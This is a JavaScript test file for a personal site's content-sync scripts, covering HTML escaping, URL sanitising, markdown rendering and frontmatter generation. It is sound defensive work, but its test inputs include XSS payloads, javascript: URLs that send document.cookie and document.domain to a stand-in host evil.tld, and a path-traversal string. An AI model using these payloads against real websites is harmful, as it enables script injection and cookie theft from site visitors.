#!/usr/bin/env node

/**
 * Tests for the content-sync scripts.
 *
 * Usage: node scripts/test-scripts.js
 *
 * These cover the failure modes that actually bit this repo: silent no-op
 * rewrites of index.html, unescaped RSS titles landing in generated HTML, and
 * frontmatter mangled by escape-then-truncate.
 */

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const posts = require('./update-posts.js');
const lib = require('./lib.js');

let passed = 0;
let failed = 0;

// Tests are queued and awaited, so a test that returns a promise is actually
// waited on. Calling fn() and moving on made any async assertion vacuous: the
// rejection landed after the summary had already printed "ok".
const queue = [];

function test(name, fn) {
  queue.push({ name, fn });
}

/** Queues a section heading so it prints in order with the tests below it. */
function section(label) {
  queue.push({ label });
}

async function run() {
  for (const { name, fn, label } of queue) {
    if (label) {
      console.log(`\n${label}`);
      continue;
    }
    try {
      await fn();
      passed++;
      console.log(`  ok    ${name}`);
    } catch (err) {
      failed++;
      console.error(`  FAIL  ${name}\n        ${err.message}`);
    }
  }
}

function withTempIndex(body, fn) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'skaronis-test-'));
  const file = path.join(dir, 'index.html');
  fs.writeFileSync(file, body);
  try {
    return fn(file);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

const SAMPLE_POST = {
  url: '/blog/hello-world/',
  title: 'Hello World',
  siteName: 'Substack',
  date: new Date('2026-03-15T12:00:00Z')
};

// ---------------------------------------------------------------------------
section('escapeHtml');

test('escapes the characters that break attributes and markup', () => {
  assert.strictEqual(
    posts.escapeHtml(`<img src=x onerror=alert(1)>`),
    '&lt;img src=x onerror=alert(1)&gt;'
  );
  assert.strictEqual(posts.escapeHtml('a "b" \'c\' & d'), 'a &quot;b&quot; &#39;c&#39; &amp; d');
});

test('handles null and undefined without throwing', () => {
  assert.strictEqual(posts.escapeHtml(null), '');
  assert.strictEqual(posts.escapeHtml(undefined), '');
});

// ---------------------------------------------------------------------------
section('formatMonthYear');

test('is stable regardless of the machine timezone', () => {
  // 1 March 00:30 UTC is still February in Vancouver. CI (UTC) and a local run
  // must not disagree, or they overwrite each other forever.
  const d = new Date('2026-03-01T00:30:00Z');
  assert.strictEqual(posts.formatMonthYear(d), 'March 2026');
});

// ---------------------------------------------------------------------------
section('renderLatestPost');

test('escapes a hostile RSS title', () => {
  const html = posts.renderLatestPost({
    ...SAMPLE_POST,
    title: '</h2><script>alert(1)</script>'
  });
  assert.ok(!html.includes('<script>'), 'raw <script> leaked into the homepage');
  assert.ok(html.includes('&lt;script&gt;'), 'title was not escaped');
});

test('a URL that would break out of the href attribute is neutralised', () => {
  const html = posts.renderLatestPost({
    ...SAMPLE_POST,
    url: '/x" onmouseover="alert(1)'
  });
  // safeUrl resolves root-relative paths through the URL parser, so the quote
  // comes back percent-encoded (%22) rather than needing HTML escaping. Either
  // way it can no longer close the attribute.
  assert.ok(!/onmouseover\s*=\s*"/.test(html), `attribute break-out survived: ${html}`);
  assert.ok(html.includes('%22'), `expected the quote to be percent-encoded: ${html}`);
});

test('a title containing $& is written literally', () => {
  // String.replace treats $& in the replacement as "the whole match". The old
  // code interpolated titles straight into a replacement string.
  const html = posts.renderLatestPost({ ...SAMPLE_POST, title: 'Cost $& Value $1' });
  assert.ok(html.includes('Cost $&amp; Value $1'), `got: ${html}`);
});

// ---------------------------------------------------------------------------
// Regression tests for the Devin review finding (2026-08-09): escaping alone
// does not stop a javascript: URL reaching an href.
section('safeUrl');

test('accepts root-relative paths and https URLs', () => {
  assert.strictEqual(posts.safeUrl('/blog/x/'), '/blog/x/');
  assert.strictEqual(posts.safeUrl('https://example.com/p'), 'https://example.com/p');
});

test('rejects javascript, data and vbscript schemes', () => {
  for (const bad of [
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    '  javascript:alert(1)  ',
    'java\tscript:alert(1)',
    'java\nscript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD4=',
    'vbscript:msgbox(1)',
    'http://example.com/insecure'
  ]) {
    assert.strictEqual(posts.safeUrl(bad), null, `should have rejected: ${JSON.stringify(bad)}`);
  }
});

test('rejects protocol-relative URLs, including the backslash forms', () => {
  // Browsers resolve "/\\evil.example" and "/\\/evil.example" off-site exactly as
  // they do "//evil.example". Verified in a real browser: /\\evil.example/x
  // resolves to http://evil.example/x. A hand-written "//" prefix check missed
  // these, so safeUrl now resolves against a placeholder origin instead.
  assert.strictEqual(posts.safeUrl('//evil.example/x'), null);
  assert.strictEqual(posts.safeUrl('/\\evil.example/x'), null);
  assert.strictEqual(posts.safeUrl('/\\/evil.example'), null);
  assert.strictEqual(posts.safeUrl('/\\\\evil.example'), null);
});

test('still accepts ordinary root-relative post paths', () => {
  assert.strictEqual(posts.safeUrl('/blog/taking-the-stairs-won-t-fix-it/'), '/blog/taking-the-stairs-won-t-fix-it/');
  assert.strictEqual(posts.safeUrl('/x.html?a=1&b=2#f'), '/x.html?a=1&b=2#f');
});

test('rejects empty and missing values', () => {
  assert.strictEqual(posts.safeUrl(''), null);
  assert.strictEqual(posts.safeUrl(null), null);
  assert.strictEqual(posts.safeUrl(undefined), null);
});

test('renderLatestPost refuses to emit a javascript: link', () => {
  assert.throws(
    () => posts.renderLatestPost({ ...SAMPLE_POST, url: 'javascript:alert(document.domain)' }),
    /unsupported URL scheme/i
  );
});

// ---------------------------------------------------------------------------
section('updateIndexHTML');

const GOOD_PAGE = `<html><body>
    <div>
                ${posts.LATEST_POST_START}
                <a href="/blog/old/" class="latest-content">
                    <h2 class="latest-title">Old Title</h2>
                    <p class="latest-meta">January 2020 · <span class="latest-source">Substack</span></p>
                </a>
                ${posts.LATEST_POST_END}
    </div>
</body></html>`;

test('rewrites the block between the markers', () => {
  withTempIndex(GOOD_PAGE, (file) => {
    const out = rewriteVia(file, SAMPLE_POST);
    assert.ok(out.includes('Hello World'), 'new title missing');
    assert.ok(out.includes('/blog/hello-world/'), 'new url missing');
    assert.ok(out.includes('March 2026'), 'new date missing');
    assert.ok(!out.includes('Old Title'), 'old title still present');
    assert.ok(out.includes(posts.LATEST_POST_START), 'start marker was consumed');
    assert.ok(out.includes(posts.LATEST_POST_END), 'end marker was consumed');
  });
});

test('is idempotent', () => {
  withTempIndex(GOOD_PAGE, (file) => {
    const once = rewriteVia(file, SAMPLE_POST);
    fs.writeFileSync(file, once);
    const twice = rewriteVia(file, SAMPLE_POST);
    assert.strictEqual(once, twice, 'second run produced different output');
  });
});

test('throws loudly when the markers are missing', () => {
  withTempIndex('<html><body><p>no markers here</p></body></html>', (file) => {
    assert.throws(
      () => rewriteVia(file, SAMPLE_POST),
      /markers/i,
      'a missing marker must fail the build, not silently no-op'
    );
  });
});

test('leaves no temp file behind', () => {
  withTempIndex(GOOD_PAGE, (file) => {
    rewriteVia(file, SAMPLE_POST);
    const leftovers = fs.readdirSync(path.dirname(file)).filter(f => f.includes('.tmp-'));
    assert.deepStrictEqual(leftovers, [], `temp files left: ${leftovers}`);
  });
});

// updateIndexHTML takes the target path, so tests operate purely on a temp file
// and can never touch the real homepage.
function rewriteVia(fixtureFile, post) {
  posts.updateIndexHTML(post, [], fixtureFile);
  return fs.readFileSync(fixtureFile, 'utf8');
}

// ---------------------------------------------------------------------------
section('renderRecentPosts');

const RECENT = [
  { title: 'One', url: '/blog/one/', date: new Date('2026-03-02T00:00:00Z') },
  { title: 'Two', url: '/blog/two/', date: new Date('2026-02-02T00:00:00Z') },
  { title: 'Three', url: '/blog/three/', date: new Date('2026-01-02T00:00:00Z') },
  { title: 'Four', url: '/blog/four/', date: new Date('2025-12-02T00:00:00Z') },
  { title: 'Five', url: '/blog/five/', date: new Date('2025-11-02T00:00:00Z') },
  { title: 'Six', url: '/blog/six/', date: new Date('2025-10-02T00:00:00Z') }
];

test('renders at most five posts', () => {
  const html = posts.renderRecentPosts(RECENT);
  assert.strictEqual((html.match(/<li>/g) || []).length, 5);
  assert.ok(!html.includes('Six'), 'sixth post should not be rendered');
});

test('escapes titles and drops unsafe URLs, keeping the title as text', () => {
  const html = posts.renderRecentPosts([
    { title: '<script>alert(1)</script>', url: 'javascript:alert(1)', date: new Date('2026-03-02T00:00:00Z') }
  ]);
  assert.ok(!html.includes('<script>'), 'raw script tag leaked');
  assert.ok(!/javascript:/i.test(html), 'javascript: URL survived');
  assert.ok(html.includes('&lt;script&gt;'), 'title should still appear, escaped');
  assert.ok(!html.includes('<a href'), 'unsafe entry must not be linked');
});

// ---------------------------------------------------------------------------
// The secgate review (2026-08-09) found the URL guard had reached 7 of 9 sinks:
// update-blog.js and update-library.js rendered markdown links and images
// straight into attributes. The suite could not have caught it because it only
// imported update-posts.js. These test the shared renderer both now use.
section('renderMarkdownLinks (shared by update-blog and update-library)');

test('renders a normal link and image', () => {
  assert.strictEqual(
    lib.renderMarkdownLinks('[text](https://example.com/p)'),
    '<a href="https://example.com/p">text</a>'
  );
  assert.strictEqual(
    lib.renderMarkdownLinks('![alt](https://example.com/i.png)'),
    '<img src="https://example.com/i.png" alt="alt">'
  );
});

test('a javascript: link degrades to plain text', () => {
  const out = lib.renderMarkdownLinks("[click](javascript:location='//evil.tld/'+document.domain)");
  assert.ok(!/javascript:/i.test(out), `javascript: survived: ${out}`);
  assert.ok(!out.includes('<a '), 'must not emit an anchor');
  assert.ok(out.includes('click'), 'link text should survive');
});

// ---------------------------------------------------------------------------
// The second secgate review found the deeper sink: the markdown BODY was never
// escaped, only its URLs were. A tag with no closing bracket slips past the
// upstream tag-strip regex entirely.
section('escapeMarkdownText (body of every generated page)');

test('neutralises raw HTML in a post body', () => {
  assert.strictEqual(
    lib.escapeMarkdownText('<script>alert(1)</script>'),
    '&lt;script&gt;alert(1)&lt;/script&gt;'
  );
});

test('neutralises an UNCLOSED tag, which the tag-strip regex cannot match', () => {
  // This was the live exploit: /<[^>]+>/g cannot match a < with no > after it,
  // so the payload reached the page and the following --- supplied the >.
  const payload = '<img src=x onerror=alert(document.domain)//';
  const out = lib.escapeMarkdownText(payload);
  assert.ok(!out.includes('<img'), `unclosed tag survived: ${out}`);
  assert.ok(out.startsWith('&lt;img'), out);
});

test('leaves & alone so link query strings are not corrupted', () => {
  // Escaping & here would turn ?a=1&b=2 into ?a=1&amp;b=2 inside the URL.
  assert.strictEqual(lib.escapeMarkdownText('a & b'), 'a & b');
});

test('escaped body text passes through the link renderer unchanged', () => {
  const body = lib.escapeMarkdownText('see <b>this</b>') + ' [link](https://example.com/p)';
  const out = lib.renderMarkdownLinks(body);
  assert.ok(out.includes('&lt;b&gt;'), 'body escaping lost');
  assert.ok(!out.includes('&amp;lt;'), `double-escaped: ${out}`);
  assert.ok(out.includes('<a href="https://example.com/p">link</a>'), out);
});

test('a javascript: image degrades to its alt text', () => {
  const out = lib.renderMarkdownLinks('![pic](javascript:alert(1))');
  assert.ok(!/javascript:/i.test(out), `javascript: survived: ${out}`);
  assert.ok(!out.includes('<img'), 'must not emit an img');
});

test('an attribute break-out cannot escape the src', () => {
  // The percent-decode path could reintroduce a literal quote.
  const out = lib.renderMarkdownLinks('![x](https://e.com/a.png" onerror="alert(1))');
  assert.ok(!/onerror\s*=\s*"?alert/.test(out.replace(/&quot;/g, '"').replace(/&#39;/g, "'")) ||
            !out.includes('<img'), `break-out survived: ${out}`);
});

test('protocol-relative and data URLs are refused', () => {
  for (const bad of ['[a](//evil.example/x)', '[a](data:text/html,<script>alert(1)</script>)']) {
    const out = lib.renderMarkdownLinks(bad);
    assert.ok(!out.includes('<a '), `should not link: ${bad} -> ${out}`);
  }
});

// ---------------------------------------------------------------------------
section('escapeMarkdownInline (llms.txt link text)');

test('a title cannot close a markdown link and supply its own destination', () => {
  // llms.txt lines are "- [name](url)". Guarding only the url leaves this open.
  const evil = "Q3 notes](javascript:fetch('//evil.tld/'+document.cookie)) [";
  const out = lib.escapeMarkdownInline(evil);
  assert.ok(!/\]\(/.test(out), `link syntax survived: ${out}`);
  assert.ok(out.includes('Q3 notes'), 'title text should survive');
});

test('collapses newlines so one entry cannot become several lines', () => {
  assert.strictEqual(lib.escapeMarkdownInline('a\nb'), 'a b');
});

// ---------------------------------------------------------------------------
section('slugify (one rule, three former copies)');

test('restricts to url- and path-safe characters', () => {
  assert.strictEqual(lib.slugify('Hello, World! -- A Post'), 'hello-world-a-post');
  assert.strictEqual(lib.slugify('../../etc/passwd'), 'etc-passwd');
  assert.strictEqual(lib.slugify('//evil.example'), 'evil-example');
});

test('returns empty for a title with nothing slug-able, so callers can skip it', () => {
  assert.strictEqual(lib.slugify('!!!'), '');
  assert.strictEqual(lib.slugify(null), '');
});

test('caps length and never ends on a separator', () => {
  const out = lib.slugify('a'.repeat(200));
  assert.ok(out.length <= 60, `too long: ${out.length}`);
  assert.ok(!out.endsWith('-'), out);
});

// ---------------------------------------------------------------------------
section('fetch failures are typed, not string-matched');

test('transport failures carry FEED_UNREACHABLE so callers need not parse messages', () => {
  // Matching err.message prefixes meant any error worded the right way took the
  // fail-open path. The code property is set by lib, not by the network.
  let captured = null;
  lib.fetch('http://example.com/insecure').catch(err => { captured = err; });
  // The non-https check rejects synchronously inside the promise executor, so
  // the rejection is already queued; drain the microtask queue.
  return Promise.resolve().then(() => {
    assert.ok(captured, 'expected a rejection');
    assert.strictEqual(captured.code, lib.FEED_UNREACHABLE, `missing code: ${captured.message}`);
  });
});

// ---------------------------------------------------------------------------
section('jsonLdScript');

test('neutralises a </script> breakout inside JSON-LD', () => {
  const out = lib.jsonLdScript({ name: '</script><img src=x onerror=alert(1)>' });
  assert.ok(!out.includes('</script>'), 'raw </script> survived into a script element');
  assert.ok(out.includes('\\u003c'), 'expected < to be unicode-escaped');
  assert.doesNotThrow(() => JSON.parse(out), 'output must still be valid JSON');
});

test('a trailing backslash still produces parseable JSON', () => {
  // update-blog.js used escapeHtml inside JSON string literals, which left
  // backslashes unescaped and could emit unparseable JSON-LD.
  const out = lib.jsonLdScript({ title: 'ends with a backslash \\' });
  assert.doesNotThrow(() => JSON.parse(out));
});

// ---------------------------------------------------------------------------
section('generateMarkdownFile frontmatter');

test('quotes a title containing double quotes', () => {
  const result = posts.generateMarkdownFile({
    title: 'She said "hello" to me',
    description: 'short',
    date: new Date('2026-01-05T00:00:00Z'),
    url: 'https://example.com/p',
    originalUrl: 'https://example.com/p',
    siteName: 'Substack',
    content: '<p>hi</p>'
  });
  const fm = result.content.split('---')[1];
  assert.ok(fm.includes('title: "She said \\"hello\\" to me"'), `got: ${fm}`);
});

test('a 200-char boundary cannot leave a dangling escape', () => {
  // Escape-then-truncate could cut between a backslash and its quote and emit
  // unparseable frontmatter. Truncate first, then quote.
  const description = 'x'.repeat(199) + '"' + 'tail';
  const result = posts.generateMarkdownFile({
    title: 'T',
    description,
    date: new Date('2026-01-05T00:00:00Z'),
    url: 'https://example.com/p',
    originalUrl: 'https://example.com/p',
    siteName: 'Substack',
    content: '<p>hi</p>'
  });
  const line = result.content.split('\n').find(l => l.startsWith('description:'));
  const value = line.slice('description: '.length);
  assert.doesNotThrow(() => JSON.parse(value), `unparseable frontmatter value: ${value}`);
});

// ---------------------------------------------------------------------------
// Guard against the drift that produced this test: internal links were fixed in
// the generated files, but the generator templates still emitted the .html
// form, so the very next CI run reverted them. Scanning the built output is the
// only check that catches a template and its product disagreeing.
section('no internal links point at a redirecting .html URL');

test('no page links to an internal .html path', () => {
  const skipDirs = new Set(['.git', 'node_modules', '.playwright-mcp', '.github']);
  const pages = [];
  (function walk(dir) {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      if (e.isDirectory()) {
        if (!skipDirs.has(e.name)) walk(path.join(dir, e.name));
      } else if (e.name.endsWith('.html')) {
        pages.push(path.join(dir, e.name));
      }
    }
  })(path.join(__dirname, '..'));

  // The host 308-redirects /x.html to /x, so an internal link to the .html form
  // costs a round trip and, in a canonical or a sitemap, actively misdirects.
  const re = /(?:href|content)="(?:https:\/\/skaronis\.com)?\/?((?:[a-z0-9-]+\/)*[a-z0-9-]+)\.html"/gi;
  const offenders = [];
  for (const p of pages) {
    for (const m of fs.readFileSync(p, 'utf8').matchAll(re)) {
      offenders.push(`${path.relative(path.join(__dirname, '..'), p)} -> ${m[0]}`);
    }
  }
  assert.deepStrictEqual(offenders, [], `internal .html links found:\n  ${offenders.join('\n  ')}`);
});

// ---------------------------------------------------------------------------
section('fetch identifies itself and types every failure');

test('sends a User-Agent', () => {
  // Goodreads returns 403 to any request without one, and Node's https.get
  // sends none by default. That single missing header stalled the reading-list
  // sync for months and looked like an IP block, because it failed identically
  // on this machine and on GitHub's runners.
  const src = fs.readFileSync(path.join(__dirname, 'lib.js'), 'utf8');
  assert.ok(/'User-Agent':\s*USER_AGENT/.test(src), 'fetch must set a User-Agent header');
  assert.ok(/const USER_AGENT = '[^']+'/.test(src), 'USER_AGENT must be defined');
});

test('a DNS failure is typed FEED_UNREACHABLE, not left as ENOTFOUND', () => {
  // Node gives socket/DNS/TLS errors its own codes. Keying the fail-soft branch
  // on FEED_UNREACHABLE alone meant a real outage skipped it and aborted the build.
  return lib.fetch('https://this-host-should-not-resolve-xyzq.invalid/feed').then(
    () => { throw new Error('expected the fetch to reject'); },
    (err) => {
      assert.strictEqual(err.code, lib.FEED_UNREACHABLE, `got ${err.code}`);
      assert.ok(err.transport, 'the original code should be preserved on .transport');
    }
  );
});

// ---------------------------------------------------------------------------
section('generateStars cannot crash the library build');

test('clamps a rating outside 0-5 instead of throwing', () => {
  // '☆'.repeat(5 - 6) throws RangeError and took the whole build with it.
  const src = fs.readFileSync(path.join(__dirname, 'update-library.js'), 'utf8');
  const m = src.match(/function generateStars\(rating\) \{[\s\S]*?\n\}/);
  const generateStars = new Function('rating', m[0].replace(/^function generateStars\(rating\) \{/, '') .replace(/\}$/, ''));
  for (const r of [-3, 0, 3, 5, 6, 99, NaN, null, 'x']) {
    assert.doesNotThrow(() => generateStars(r), `threw on rating=${r}`);
  }
  assert.strictEqual(generateStars(3).length, 5);
  assert.strictEqual(generateStars(99).length, 5);
});

// ---------------------------------------------------------------------------
run().then(() => {
  console.log(`\n${passed} passed, ${failed} failed\n`);
  process.exit(failed === 0 ? 0 : 1);
});
